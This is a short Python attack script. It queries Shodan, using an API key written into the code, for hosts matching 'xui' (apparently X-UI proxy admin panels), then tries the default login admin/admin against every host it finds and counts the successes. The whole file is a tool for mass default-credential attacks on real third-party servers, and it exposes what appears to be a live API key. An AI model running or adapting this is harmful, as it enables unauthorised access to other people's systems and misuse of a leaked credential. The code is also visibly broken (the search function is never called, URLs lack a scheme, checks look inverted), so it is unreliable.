import shodan,re,requests as req

# regex = (r"\d")
url_ip = []
def get_shodan_data_xui(): #Get data from shodan(query is XUI)
    api , data_list= shodan.Shodan("FBCWUSFYaT6Jo6eQAzkzVK5PKvkbQeDh") ,[]
    result = api.search("xui")
    for device in result['matches']:
        if 'HTTP/1.1 200 OK' in device['data']:
            data = {
                'port': device['port'],
                'ip': device['ip_str'],
#                 'hostname': device['hostnames'][0] if device['hostnames'] else '',
            }
            data_list.append(data)
    for data in data_list:
#         print(f"IP: {data['ip']}:{data['port']}")
        url_ip.append(f"{data['ip']}:{data['port']}")
        ips = f"{data['ip']}:{data['port']}".replace("'",'')
        try:
            r = req.get(ips)
            if r.status_code == 200:
                print('not work: ',ips)
        except:
            print(ips)

        # ip = data['ip']+':54321'
datas = {'username': 'admin', 'password': 'admin'}
count = 0
for ip in url_ip:
    p = req.get(f"http://{ip}/",data=datas).status_code
    print(p)
    
    if p == 200:
        count += 1
        print(f"{count} > {ip}")
    else:
        print('wrong')
